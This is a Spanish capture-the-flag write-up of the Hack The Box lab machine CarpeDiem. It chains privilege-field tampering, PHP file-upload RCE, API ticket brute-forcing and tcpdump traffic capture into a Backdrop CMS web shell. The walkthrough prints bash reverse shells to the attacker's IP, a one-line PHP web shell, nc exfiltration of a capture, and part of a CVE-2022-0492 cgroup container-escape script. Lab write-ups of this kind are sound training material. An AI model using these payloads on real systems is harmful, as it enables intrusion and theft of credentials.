________________________________________________________________________________________________________

CarpeDiem es una máquina Linux de dificultad Hard que combina múltiples vectores 
de ataque encadenados. Comenzamos enumerando subdominios para descubrir un portal 
de motocicletas vulnerable, donde abusamos de un parámetro `login_type` interceptado 
con Burpsuite para acceder como administrador. Desde el panel admin subimos un archivo 
PHP malicioso obteniendo RCE dentro de un contenedor Docker. Pivotamos a través de 
la API de Trudesk usando un token encontrado en el código fuente, recuperamos 
credenciales de un mensaje de voz VoIP y accedemos por SSH. Para la escalada 
aprovechamos las capabilities de `tcpdump` para capturar tráfico HTTPS cifrado, 
extraemos la clave SSL y obtenemos credenciales del CMS Backdrop. Finalmente 
escapamos del contenedor Docker explotando **CVE-2022-0492** para comprometer 
la máquina como root.

![img](assets/carpeDime/portada.png)

________________________________________________________________________________________________________

### Enumeración namp

```bash
nmap -sS -p- -n -Pn 10.10.11.167 -oG scanPorts
nmap -sCV -p22,80 -n -Pn 10.10.11.167 -oN allPorts
```

![nmap1](assets/carpeDime/nmap1.png)

Una vez enumerado los puertos procedemos a meternos a la web por el puerto 80 desde nuestro navegador. Vemos un dominio que introducimos en nuestro `/etc/hosts` para que nuestro equipo aplique la resolución de dominios. 

```bash
echo -e "10.10.11.167 carpediem.htb" >> /etc/hosts
```

![img](assets/carpeDime/web2.png)

Testeando un poco la web no parece que haya gran cosa, así que el siguiente paso será aplicar una ataque de fuerza bruta para ver si encontramos algún sub-domain expuesto.
### Descubriendo sub-domians con wfuzz

```bash
 wfuzz -c -t 100 --hh=2875 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u carpediem.htb -H "http://FUZZ.carpediem.htb"
```

![img](assets/carpeDime/cap3.png)

Agregamos este sub-dominio a nuestro archivo `/etc/hosts`. 
Dentro de **portal.carpediem.htb** vemos que estamos ante una web de venta de motocicletas, con **wig** y **wappalayzer** realizamos una primera enumeración para encontrar el servidor y el lenguaje de programación que corre en el back-end.

![img](assets/carpeDime/cap4.png)

![img](assets/carpeDime/cap5.png)

El siguiente paso será proceder a realizar una enumeración de directorios

```bash
gobuster dir -u http://portal.carpediem.htb/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-1.0.txt -t 100
```

![img](assets/carpeDime/cap6.png)

Visitando un poco todos los directorios me llama la atención el **admin**, lo pongo en mi **URL** y me lleva a un panel de autenticación que parece para gente de dentro de la empresa.

![img](assets/carpeDime/cap7.png)

Ahora volvemos a la pagina principal y procedemos a registrarnos, me llama la atención que ya estando registrados si vamos al panel anterior de **admin** nos devuelve una mensaje de acceso denegado.

![img](assets/carpeDime/cap8.png)

 Una vez registrados pinchando arriba a la derecha en nuestro nombre que hemos usado de usuario y luego en **mannager account** nos lleva a un formulario de relleno en el que al parecer podemos editar nuestra contraseña. 

![img](assets/carpeDime/cap9.png)

![img](assets/carpeDime/cap10.png)

Interceptamos la petición con Burpsuite

![img](assets/carpeDime/cap11.png)

Vemos que en el campo `login_type=2`, si cambiamos el valor a 1 nos cambia la cuenta a administradores. Ahora si volvemos al panel de antes de `admin` ya nos deja acceder y estamos como administradores dentro del panel de administración de la web. Enumerando todo el panel hay dos sitios que me llaman la atención. 

**Trudesk** es una plataforma de **help desk** y **gestión de tickets** diseñada para ayudar a empresas y organizaciones a gestionar sus tareas de soporte técnico y atención al cliente de manera más eficiente. Es una herramienta de código abierto que se enfoca en proporcionar una solución fácil de usar para la gestión de incidencias, seguimiento de problemas y mejora de la productividad del equipo de soporte.

![img](assets/carpeDime/cap12.png)

Si intentamos añadir algo al ticket y lo interceptamos con **Burpsuite** vemos que nos devuelve un mensaje de error, la solicitud está incompleta. 

![img](assets/carpeDime/cap13.png)

Me creo un formulario HTML básico con chatgp, me monto un servidor con python en mi localhost e interceptó la petición y completo todos los campos requeridos en nuestra petición inicial para poder subir un archivo `.php` 

![img](assets/carpeDime/cap14.png)
Nos desplazamos a la ruta que nos devuelve y podemos ver que tenemos ejecución remota de comandos **RCE** a través del archivo malicioso que hemos subido. 

![img](assets/carpeDime/cap15.png)
Simplemente inyectamos el siguiente **payload** y nos metemos dentro de la máquina.

```bash
bash -c "bash -i >%26 /dev/tcp/10.10.16.3/4043 0>%261"
```

## DENTRO DE LA MÁQUINA

Dentro de la máquina podemos ver que estamos dentro de un contenedor **docker** como el usuario `www-data`.

```bash
whoami; hostname -I
```

![img](assets/carpeDime/cap16.png)

Enumerando la máquina me llama la atención el siguiente script `Truedesk.php`, que tiene el nombre de la aplicación que habíamos explicado antes. Dentro vemos que hay un nuevo sub-dominio que introducimos en nuestro `/etc/hosts` y también vemos que hay un token de una api y un username.

![img](assets/carpeDime/cap17.png)
En el script **DBConnection.php** también encontramos unas credenciales para una conexión a una base de datos **MySQL**

![img](assets/carpeDime/cap18.png)

## TRUDESK

Estamos ante un nuevo panel de autenticación en el que pruebo las credenciales que hemos encontrados de la base de datos pero no son correctas.

![img](assets/carpeDime/cap19.png)

Vamos a proceder a enumerar con gobuster la web

```bash
gobuster dir -u http://trudesk.carpediem.htb/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-1.0.txt -t 100 -x php,md,txt
```

Encontraremos un directorio **/api**, sabiendo que tenemos un token para una api podemos saber ya que hay corriendo una api para esta aplicación, así que vamos a intentar enumerar los puntos finales. Al parecer hay dos versiones de la api, en este punto vamos a ir a la [documentación](https://docs.trudesk.io/v1/api/) e intentaremos tirar siempre a enumerar y explotar la versión más antigua de la **api**.

![img](assets/carpeDime/cap20.png)

Leyendo la documentación vamos tal y como nos comentan primero hay que adivinar los números **uid** de los tickets, me hago un archivo **UID** donde metemos los números del 1 al 10000 y posteriormente realizar con **wfuzz** un ataque de fuerza bruta probando estos UID, y obtenemos los UID a los que podemos acceder a su contenido con nuestros tocken.

```bash
for i in $(seq 1 10000); do echo $i; done >> UID
wfuzz -c -w UID -t 100 --hh=42 -H "accesstoken: f8691bd2d8d613ec89337b5cd5a98554f8fffcc4" http://trudesk.carpediem.htb/api/v1/tickets/FUZZ
```

![img](assets/carpeDime/cap21.png)
```bash
for i in $(seq 1004 1008); do curl -H "accesstoken: f8691bd2d8d613ec89337b5cd5a98554f8fffcc4" -H "Content-Type: application/json" -l http://trudesk.carpediem.htb/api/v1/tickets/$i | jq; done >> data.json
catn data.json | grep 'comment' | grep -A 100 "Thanks Robert" | head -n 2 | sed 's/"comment": "//g; s/<[^>]*>//g' | tr -d '\\n' > VoiP
```

![img](assets/carpeDime/cap22.png)

Podemos recuperar esta conversación en la que tenemos un código de acceso a un correo de voz donde parce que hay unas credenciales. Para poder acceder a este mensaje de voz hay que bajarse la aplicación **Zoiper**. Nos descargamos la aplicación si no la tenemos y seguimos los pasos para acceder al mensaje de voz.

![img](assets/carpeDime/cap23.png)

Leyendo los tickets también sabemos que el nuevo empleado se llama Horace Flaccus, así que con su nombre y las credenciales procedemos a conectarnos al servidor por **ssh**. Pruebo diferentes nombres hasta que encuentro el correcto que es **hflaccus**.  

![img](assets/carpeDime/cap24.png) 


```bash
 ssh hflaccus@10.10.11.167
```

Una vez conectados encontramos la primer bandera.

## ESCALADA DE PRIVILEGIOS

Enumerando el sistema vemos que hay varios usuarios y varias conexiones, también encuentro binarios con capabilities especiales, como tcpdump que tiene las capabilities `cap_net_admin` y `cap_net_raw+eip`. La capabilitie `cap_net_raw` nos permite abrir raw sockets para capturar paquetes, mientras que `cap_net_admin` nos permite entre otras cosas poner la interfaz en modo promiscuo, lo que combinado nos da capacidad de interceptar todo el tráfico de la red.

![img](assets/carpeDime/cap25.png)

Hacemos un portfordwarding de las conexiones y lo interesante esta por el puerto 8002 donde corre un CMS **backdrop**. Necesitamos unas credenciales para entrar en el CMS y probando con las que hemos conseguido hasta ahora no me funciona ninguna.

```bash
ssh -L 8001:127.0.0.1:8001 -L 8002:127.0.0.1:8002 -L 5038:127.0.0.1:5038 hflaccus@10.10.11.167
```

![img](assets/carpeDime/cap26.png)

Aprovechando las capabilities que tenemos en **tcpdump** me pongo en escucha en la interfaz docker para capturar el tráfico. Guardamos el tráfico capturado en un archivo y nos lo pasamos a nuestra máquina de atacante para analizarlo con **whireshark**. 

```bash
tcpdump -i docker0 -w traf.cap
nc 10.10.16.3 1234 < traf.cap
sudo nc -nvlp 1234 > traf.cap ->  "MI MÁQUINA DE ATACANTE"
```

Dado que el tráfico como vemos esta cifrado ya que estamos usando **https**, procedo a buscar la clave ssl para introducirla en mi **whiresark**. Me la transfiero a mi sistema y la añado y procedo a identificar la captura del tráfico de la red.

```bash
find / -regex '.*backdrop.*' 2>/dev/null
```

![img](assets/carpeDime/cap27.png)

![img](assets/carpeDime/cap28.png)

### Dentro de backdrop como **admin**

Una vez dentro del CMS nos dirigismos a la siguiente ruta donde podemos ver diferentes variables de la configuración, entre ellas las versión que estamos usando. Con una simple búsqueda por internet de la versión vemos que hay una vulnerabilidad crítica que nos permite una ejecución remota de comandos **RCE** a través de la subida de un archivo `.zip`. En el siguiente enlace se explica perfectamente como explotarla [**backdrop_vulnerabily**](https://grimthereaperteam.medium.com/backdrop-cms-1-22-0-unrestricted-file-upload-layouts-ce49a6b7e521). 

![img](assets/carpeDimecap29.png)

Para explotar la vulnerabilidad nos bajamos de su [web](https://backdropcms.org/project/examples) los módulos de prueba y cogemos por ejemplo el **form_example**. Metemos en el módulo un archivo malicioso que escribimos nosotros y posteriormente comprimimos todo el módulo un archivo zip.

```bash
echo -n '<?php system($_GET["cmd"]); ?>' > cmd.php
mv cmd.php /tmp/form_example
zip field_example.zip form_example
```

Ahora vamos a la siguiente ruta y subimos el archivo

![img](assets/carpeDime/cap30.png)

![img](assets/carpeDime/cap31.png)

Una vez subido vamos a la siguiente ruta `/modules/form_example/cmd.php` y comprobamos que efectivamente todo ha salido bien y tenemos ejecución remota de comandos, así que en este punto simplemente generamos un one-line para enviarnos una shell a nuestro equipo y entramos como **www-data**

![img](assets/carpeDime/cap32.png)
______
### DENTRO DE UN NUEVO CONTENEDOR

![img](assets/carpeDime/cap33.png)
Enumerando la máquina veo que hay script corriendo cada poco tiempo que lo esta ejecutando **root**, así que me muevo a la ruta para leerlo.

![img](assets/carpeDime/cap34.png)

Vemos el script **heartbeat.sh** que hace un checksum donde si el hash **backdrop.sh** no es igual a hash MD5 el script termina aquí, por lo tanto **backdrop.sh** no se puede editar. Este script de **backdrop.sh** se utiliza para montar backdrop.

![img](assets/carpeDime/cap35.png)

Si vemos el script **backdrop.sh** que es propiedad de root vemos que dentro del script esta incluido el **index.php** que es propiedad de **www-data**, por lo que podemos escribir en **index.php** y se ejecutará la instrucción como **root**

![img](assets/carpeDime/cap36.png)

![img](assets/carpeDime/recap1.png)

Creamos nuestro archivo para enviarnos la revershell en un directorio que tengamos la capacidad de escribir como **www-data** y luego introducimos la instrucción en **php** para que ejecute nuestro revershell.

```bash
echo -e '#!/bin/bash \n\nbash -i >& /dev/tcp/10.10.16.4/9001 0>&1' > reverse
echo 'system("bash /dev/shm/reverse");' >> /var/www/html/backdrop/index.php
```

Estando ya como **root** dentro del contenedor buscamos formas de como escapar de contenedores, encontramos lo siguiente en **[Hacktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/docker-release_agent-cgroups-escape)**. Al final investigando veo que podemos explotar la vulnerabilidad **CVE-2022-0492**, me descargó el siguiente exploit y lo ejecutó. La forma de usar el exploit es pasando el comando que queremos usar como root, yo lo que hago es pasarle un `cat /root/.ssh/id_rsa` para ver la clave ssh y copiármela a mi equipo y conectarme como root a la máquina.

```bash
    echo "[+] You have CAP_SYS_ADMIN!"
else
    echo "[-] You donot have CAP_SYS_ADMIN, will try"
fi



#try escape
while read -r subsys
do
    if [ $ifSysAdmin == 1 ]
    then
        if mount -t cgroup -o $subsys cgroup $mountDir 2>&1 >/dev/null && test -w $mountDir/release_agent >/dev/null 2>&1 ; then
            ./escape.sh $subsys $mountDir $hostPath 
            echo "[+] Escape Success!"
            rm -r $mountDir
            cat /result
            rm  /result
            exit 0
        fi
    else
        if unshare -UrmC --propagation=unchanged bash -c "mount -t cgroup -o $subsys cgroup $mountDir 2>&1 >/dev/null && test -w $mountDir/release_agent" >/dev/null 2>&1 ; then
            unshare -UrmC --propagation=unchanged bash -c "./escape.sh $subsys $mountDir $hostPath"
            echo "[+] Escape Success with unshare!"
            rm -r $mountDir
            cat /result
            rm  /result
            exit 0
        fi
    fi
done <<< $(cat /proc/$$/cgroup | grep -Eo '[0-9]+:[^:]+' | grep -Eo '[^:]+$')

echo "[-] Escape Fail!"
rm -r $mountDir
```

![img](assets/carpeDime/cap37.png)

Me copio la clave a un archivo `ìd_rsa` y le asigno los permisos correctos para poder conectarme pos ssh

```bash
chmod 600 id_rsa
ssh -i id_rsa root@10.10.11.167
```

![img](assets/carpeDime/flagroot.png)

